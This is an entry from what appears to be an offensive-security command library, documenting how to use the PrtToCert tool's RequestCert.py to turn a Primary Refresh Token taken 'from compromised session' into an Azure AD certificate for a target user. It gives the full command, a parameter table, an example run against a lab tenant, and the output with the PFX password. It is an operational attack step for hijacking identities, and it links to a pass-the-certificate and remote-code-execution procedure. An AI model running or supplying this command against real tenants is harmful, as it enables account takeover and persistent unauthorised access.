---
id: 3119418e-8e00-4623-934f-715e91e674b7
name: convert-prt-to-azure-certificate
type: command
executor: bash
data: >-
  python RequestCert.py --tenantId $_TENANT_ID --prt $_PRT --userName
  $_USERNAME@$_TENANT_NAME.onmicrosoft.com --hexCtx $_HEX_CONTEXT
  --hexDerivedKey $_HEX_DERIVED_KEY
output: >-
  PFX saved with the name $_USERNAME@$_TENANT_NAME.onmicrosoft.com.pfx and
  password is: "AzureADCert"
created_at: '2023-05-25T18:50:44.624549+00:00'
updated_at: '2023-05-25T18:50:44.779119+00:00'
platforms:
  - Cloud
tags:
  - azure-ad
  - certificate
  - prt
verified: true
validated: true
---

# convert-prt-to-azure-certificate

## Command

```bash
python RequestCert.py --tenantId $_TENANT_ID --prt $_PRT --userName $_USERNAME@$_TENANT_NAME.onmicrosoft.com --hexCtx $_HEX_CONTEXT --hexDerivedKey $_HEX_DERIVED_KEY
```

## Description

This command uses the PrtToCert tool to generate an Azure AD certificate from a Primary Refresh Token (PRT), enabling certificate-based authentication in place of passwords or tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --tenantId $_TENANT_ID | Azure AD Tenant ID (GUID) | Yes |
| --prt $_PRT | Base64-encoded PRT from compromised session | Yes |
| --userName $_USERNAME@$_TENANT_NAME.onmicrosoft.com | Full UPN of the target user | Yes |
| --hexCtx $_HEX_CONTEXT | Hexadecimal context from PRT session | Yes |
| --hexDerivedKey $_HEX_DERIVED_KEY | Hexadecimal derived key from PRT | Yes |

## Examples

### Basic Usage

```bash
python RequestCert.py --tenantId 2c240ecc-... --prt QVFBQkFBQUFBQUFHVl9idjIxb1FRNFJPcWgwXzEtdEFnbm9IbkFCZkgxcG1zbFFERENFY195OXFMTEF5bDhpZ3FrQ1RZa0dTdElqa3pGcXZ5... --userName Gadmin@ResearchAadLabEnv.onmicrosoft.com --hexCtx e096b37dc0d8e5cde438... --hexDerivedKey b8a39c7b3b7e7c859b...
```

### Advanced Usage

Run in a virtual environment with required Python libraries installed.

## Expected Output

The command outputs a success message indicating the PFX file has been saved, e.g.:

```
PFX saved with the name Gadmin@ResearchAadLabEnv.onmicrosoft.com.pfx and password is: "AzureADCert"
```

No errors should occur if inputs are valid; check for the .pfx file in the current directory.

## Related

- [[procedures/azure-pass-the-certificate-ad-cert-request-and-rce]]
- [[tools/prt-to-cert]]
